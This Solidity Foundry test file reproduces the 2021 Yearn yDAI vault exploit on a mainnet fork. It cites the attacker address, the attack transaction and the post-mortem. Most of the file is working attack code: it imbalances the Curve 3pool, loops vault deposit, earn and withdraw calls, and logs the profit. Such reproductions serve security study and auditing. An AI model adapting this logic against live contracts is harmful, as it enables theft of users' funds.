// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./interface.sol";
//Converted to foundry test from this file https://gist.github.com/xu3kev/cb1992269c429647d24b6759aff6261c

// @KeyInfo - Total Lost : ~11M US$
// Attacker : 0x14EC0cD2aCee4Ce37260b925F74648127a889a28
// Attack Contract : 0x62494b3ed9663334E57f23532155eA0575C487C5
// Vulnerable Contract : 0xACd43E627e64355f1861cEC6d3a6688B31a6F952
// Attack Tx : https://etherscan.io/tx/0x59faab5a1911618064f1ffa1e4649d85c99cfd9f0d64dcebbc1af7d7630da98b

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xACd43E627e64355f1861cEC6d3a6688B31a6F952#code

// @Analysis
// Post-mortem : https://github.com/yearn/yearn-security/blob/master/disclosures/2021-02-04.md
// Twitter Guy : https://www.google.com/

interface ICurve {
    function add_liquidity(uint256[3] memory amounts, uint256 min_mint_amount) external;
    function remove_liquidity_imbalance(uint256[3] memory amounts, uint256 max_burn_amount) external;
    function remove_liquidity(
        uint256 token_amount,
        uint256[3] memory min_amounts
    ) external returns (uint256[3] memory);
    function get_virtual_price() external view returns (uint256 out);
}

interface IYVDai {
    function balanceOf(address) external view returns (uint256);
    function deposit(uint256 _amount) external;
    function earn() external;
    function withdrawAll() external;
}

contract Exploit is Test {
    using stdStorage for StdStorage;

    IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 crv3 = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    IYVDai yvdai = IYVDai(0xACd43E627e64355f1861cEC6d3a6688B31a6F952);
    ICurve curve = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);

    // Declare your exploit parameters here
    uint256 constant max_3crv_amount = 300_000_000_000_000_000_000_000_000;
    uint256 constant remove_usdt_amt = 167_473_454_967_245;
    uint256 constant remove_usdt_amt_final_round = 167_288_317_922_857;
    uint256[] earn_amt = [
        105_469_871_996_916_702_826_725_376,
        104_706_920_396_703_142_299_856_646,
        103_948_014_417_774_019_565_578_888,
        103_192_919_800_803_744_390_557_088,
        102_441_640_504_232_413_679_923_590
    ];
    uint256 constant init_add_dai_amt = 37_972_761_178_915_525_047_091_200;
    uint256 constant init_add_usdc_amt = 133_000_000_000_000;

    constructor() {
        // Approvals and initialization logic goes here
    }

    function writeTokenBalance(address who, address token, uint256 amt) internal {
        stdstore.target(token).sig(IERC20(token).balanceOf.selector).with_key(who).checked_write(amt);
    }

    function setUp() public {
        vm.createSelectFork("mainnet", 11_792_183);
        uint256 max_earn_amt = 0;
        for (uint256 i = 0; i < earn_amt.length; i++) {
            if (earn_amt[i] > max_earn_amt) {
                max_earn_amt = earn_amt[i];
            }
        }
        require(max_earn_amt > 0, "0 is max amt?");

        //Initialize initial token balances
        writeTokenBalance(address(this), address(dai), init_add_dai_amt + max_earn_amt);
        writeTokenBalance(address(this), address(usdc), init_add_usdc_amt);

        //Approvals
        dai.approve(address(yvdai), type(uint256).max);
        TransferHelper.safeApprove(address(usdt), address(curve), type(uint256).max);
        dai.approve(address(curve), type(uint256).max);
        usdc.approve(address(curve), type(uint256).max);
    }

    function testAttack() public {
        // Construct the exploit logic here
        uint256 hacker_dai_amt_before = dai.balanceOf(address(this));
        uint256 hacker_usdc_amt_before = usdc.balanceOf(address(this));
        require(usdt.balanceOf(address(this)) == 0, "has usdt");
        require(crv3.balanceOf(address(this)) == 0, "has c3rv");
        require(yvdai.balanceOf(address(this)) == 0, "has ydai");

        // First make the pool imbalanced
        curve.add_liquidity([init_add_dai_amt, init_add_usdc_amt, 0], 0);

        // Exploit loop
        for (uint256 i = 0; i < 5; i++) {
            curve.remove_liquidity_imbalance([0, 0, remove_usdt_amt], max_3crv_amount);

            yvdai.deposit(earn_amt[i]);
            yvdai.earn();

            if (i != 4) {
                curve.add_liquidity([0, 0, remove_usdt_amt], 0);
            } else {
                curve.add_liquidity([0, 0, remove_usdt_amt_final_round], 0);
            }

            yvdai.withdrawAll();
        }

        // Convert some 3crv
        uint256 dai_difference = hacker_dai_amt_before - dai.balanceOf(address(this));
        curve.remove_liquidity_imbalance([dai_difference + 1, init_add_usdc_amt + 1, 0], max_3crv_amount);
        require(dai.balanceOf(address(this)) == hacker_dai_amt_before + 1, "incorrect dai bal after attack");
        require(usdc.balanceOf(address(this)) == hacker_usdc_amt_before + 1, "incorrect usdc amount after attack");

        //Lets give back our initial funding to see real profit
        writeTokenBalance(address(this), address(dai), dai.balanceOf(address(this)) - hacker_dai_amt_before);
        writeTokenBalance(address(this), address(usdc), usdc.balanceOf(address(this)) - hacker_usdc_amt_before);
        //This is attacker profit, Only does one run to show it
        console.log("Attacker get 3crv amt: %d", crv3.balanceOf(address(this)) / 1e18);
        console.log("Attacker get usdt amt: %d", usdt.balanceOf(address(this)) / 1e6);
    }
}
